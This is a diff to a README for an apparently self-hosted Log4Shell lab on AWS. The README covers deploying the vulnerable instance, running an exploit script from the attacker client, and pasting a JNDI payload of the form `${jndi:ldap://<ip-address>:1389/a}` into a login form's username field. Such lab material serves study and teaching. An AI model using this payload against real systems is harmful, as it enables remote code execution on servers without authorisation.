@@ -64,15 +64,14 @@ For double-instance, ensure `http:<aws host url>` is accessible
 \* please note that spining up 'double-instance' takes a lot more time, can use `journalctl -f` after ssh into the system to track progress
   
 If you do follow journal, "Reached target Cloud-init target." means its ready state.  
-![exploit](./images/ready_state_double-instance-journal.png|width=70) 
+![exploit](./images/ready_state_double-instance-journal.png) 
 
 ## Prepare Remote / Localhost client (attacker):
 Set execute permission
 `chmod +x ../exploit-script-remote.sh`    
 
 Run script with supplied variable   
-`../exploit-script-remote.sh <desktop | cloud>`  
-where desktop means your workdir is at Desktop and cloud means your workdir at ~.
+`../exploit-script-remote.sh`  
 
 Note the payload is displayed end of script similar to `${jndi:ldap://<ip-address>:1389/a}`
 
@@ -81,7 +80,7 @@ Visit `http:<aws host url>:8080`
 
 Copy the payload into the 'username' field then submit forms  
 
-![exploit](./images/attempt-exploit.png|width=70) 
+![exploit](./images/attempt-exploit.png) 
 
 
 ## Remark 
@@ -125,6 +124,7 @@ https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-regions-availability-z
 * managed to use spot instance instead of normal for some cost saving
 * Docker exposing port may overwrite firewall rules
 * (lots of time spent) Setting up and Troublehouting networking take lots of time - Route, vpc need 1 sec-group and ec2 host need another sec-group - and both sec-group need to point to vpc
+* wget cannot do long download session
 
 
 # # Time keeping
